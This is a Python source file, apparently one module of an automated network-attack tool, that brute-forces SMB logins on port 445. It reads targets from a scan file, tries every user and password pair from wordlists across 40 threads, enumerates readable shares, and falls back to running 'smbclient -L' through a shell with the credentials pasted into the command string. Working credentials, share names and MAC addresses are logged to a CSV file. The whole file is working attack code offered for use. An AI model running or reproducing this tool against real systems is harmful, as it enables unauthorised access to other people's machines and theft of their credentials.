"""
smb_connector.py - This script performs a brute force attack on SMB services (port 445) to find accessible shares using various user credentials. It logs the results of successful connections.
"""
import os
import pandas as pd
import threading
import logging
import time
from subprocess import Popen, PIPE
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from smb.SMBConnection import SMBConnection
from queue import Queue
from shared import SharedData
from logger import Logger

# Configure the logger
logger = Logger(name="smb_connector.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "SMBBruteforce"
b_module = "smb_connector"
b_status = "brute_force_smb"
b_port = 445
b_parent = None

# List of generic shares to ignore
IGNORED_SHARES = {'print$', 'ADMIN$', 'IPC$', 'C$', 'D$', 'E$', 'F$'}

class SMBBruteforce:
    """
    Class to handle the SMB brute force process.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.smb_connector = SMBConnector(shared_data)
        logger.info("SMBConnector initialized.")

    def bruteforce_smb(self, ip, port):
        """
        Run the SMB brute force attack on the given IP and port.
        """
        return self.smb_connector.run_bruteforce(ip, port)
    
    def execute(self, ip, port, row, status_key):
        """
        Execute the brute force attack and update status.
        """
        self.shared_data.bjornorch_status = "SMBBruteforce"
        success, results = self.bruteforce_smb(ip, port)
        return 'success' if success else 'failed'

class SMBConnector:
    """
    Class to manage the connection attempts and store the results.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.scan = pd.read_csv(shared_data.netkbfile)

        if "Ports" not in self.scan.columns:
            self.scan["Ports"] = None
        self.scan = self.scan[self.scan["Ports"].str.contains("445", na=False)]

        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.smbfile = shared_data.smbfile
        # If the file doesn't exist, it will be created
        if not os.path.exists(self.smbfile):
            logger.info(f"File {self.smbfile} does not exist. Creating...")
            with open(self.smbfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,Share,User,Password,Port\n")
        self.results = []  # List to store results temporarily
        self.queue = Queue()
        self.console = Console()

    def load_scan_file(self):
        """
        Load the netkb file and filter it for SMB ports.
        """
        self.scan = pd.read_csv(self.shared_data.netkbfile)

        if "Ports" not in self.scan.columns:
            self.scan["Ports"] = None
        self.scan = self.scan[self.scan["Ports"].str.contains("445", na=False)]

    def smb_connect(self, adresse_ip, user, password):
        """
        Attempt to connect to an SMB service using the given credentials.
        """
        conn = SMBConnection(user, password, "Bjorn", "Target", use_ntlm_v2=True)
        try:
            conn.connect(adresse_ip, 445)
            shares = conn.listShares()
            accessible_shares = []
            for share in shares:
                if share.isSpecial or share.isTemporary or share.name in IGNORED_SHARES:
                    continue
                try:
                    conn.listPath(share.name, '/')
                    accessible_shares.append(share.name)
                    logger.info(f"Access to share {share.name} successful on {adresse_ip} with user '{user}'")
                except Exception as e:
                    logger.error(f"Error accessing share {share.name} on {adresse_ip} with user '{user}': {e}")
            conn.close()
            return accessible_shares
        except Exception as e:
            return []

    def smbclient_l(self, adresse_ip, user, password):
        """
        Attempt to list shares using smbclient -L command.
        """
        command = f'smbclient -L {adresse_ip} -U {user}%{password}'
        try:
            process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
            stdout, stderr = process.communicate()
            if b"Sharename" in stdout:
                logger.info(f"Successful authentication for {adresse_ip} with user '{user}' & password '{password}' using smbclient -L") 
                logger.info(stdout.decode())
                shares = self.parse_shares(stdout.decode())
                return shares
            else:
                logger.error(f"Failed authentication for {adresse_ip} with user '{user}' & password '{password}' using smbclient -L")
                return []
        except Exception as e:
            logger.error(f"Error executing command '{command}': {e}")
            return []

    def parse_shares(self, smbclient_output):
        """
        Parse the output of smbclient -L to get the list of shares.
        """
        shares = []
        lines = smbclient_output.splitlines()
        for line in lines:
            if line.strip() and not line.startswith("Sharename") and not line.startswith("---------"):
                parts = line.split()
                if parts and parts[0] not in IGNORED_SHARES:
                    shares.append(parts[0])
        return shares

    def worker(self, progress, task_id, success_flag):
        """
        Worker thread to process items in the queue.
        """
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break

            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
            shares = self.smb_connect(adresse_ip, user, password)
            if shares:
                with self.lock:
                    for share in shares:
                        if share not in IGNORED_SHARES:
                            self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
                            logger.success(f"Found credentials for IP: {adresse_ip} | User: {user} | Share: {share}")
                    self.save_results()
                    self.removeduplicates()
                    success_flag[0] = True
            self.queue.task_done()
            progress.update(task_id, advance=1)

    def run_bruteforce(self, adresse_ip, port):
        self.load_scan_file()  # Reload the scan file to get the latest IPs and ports

        mac_address = self.scan.loc[self.scan['IPs'] == adresse_ip, 'MAC Address'].values[0]
        hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]

        total_tasks = len(self.users) * len(self.passwords)
        
        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
            task_id = progress.add_task("[cyan]Bruteforcing SMB...", total=total_tasks)
            
            for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                t.start()
                threads.append(t)

            while not self.queue.empty():
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
                    while not self.queue.empty():
                        self.queue.get()
                        self.queue.task_done()
                    break

            self.queue.join()

            for t in threads:
                t.join()

        # If no success with direct SMB connection, try smbclient -L
        if not success_flag[0]:
            logger.info(f"No successful authentication with direct SMB connection. Trying smbclient -L for {adresse_ip}")
            for user in self.users:
                for password in self.passwords:
                    progress.update(task_id, advance=1)
                    shares = self.smbclient_l(adresse_ip, user, password)
                    if shares:
                        with self.lock:
                            for share in shares:
                                if share not in IGNORED_SHARES:
                                    self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
                                    logger.success(f"(SMB) Found credentials for IP: {adresse_ip} | User: {user} | Share: {share} using smbclient -L")
                                    self.save_results()
                                    self.removeduplicates()
                                    success_flag[0] = True
                    if self.shared_data.timewait_smb > 0:
                        time.sleep(self.shared_data.timewait_smb)  # Wait for the specified interval before the next attempt

        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful

    def save_results(self):
        """
        Save the results of successful connection attempts to a CSV file.
        """
        df = pd.DataFrame(self.results, columns=['MAC Address', 'IP Address', 'Hostname', 'Share', 'User', 'Password', 'Port'])
        df.to_csv(self.smbfile, index=False, mode='a', header=not os.path.exists(self.smbfile))
        self.results = []  # Reset temporary results after saving

    def removeduplicates(self):
        """
        Remove duplicate entries from the results CSV file.
        """
        df = pd.read_csv(self.smbfile)
        df.drop_duplicates(inplace=True)
        df.to_csv(self.smbfile, index=False)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        smb_bruteforce = SMBBruteforce(shared_data)
        logger.info("[bold green]Starting SMB brute force attack on port 445[/bold green]")
        
        # Load the netkb file and get the IPs to scan
        ips_to_scan = shared_data.read_data()
        
        # Execute the brute force on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            smb_bruteforce.execute(ip, b_port, row, b_status)
        
        logger.info(f"Total number of successful attempts: {len(smb_bruteforce.smb_connector.results)}")
        exit(len(smb_bruteforce.smb_connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
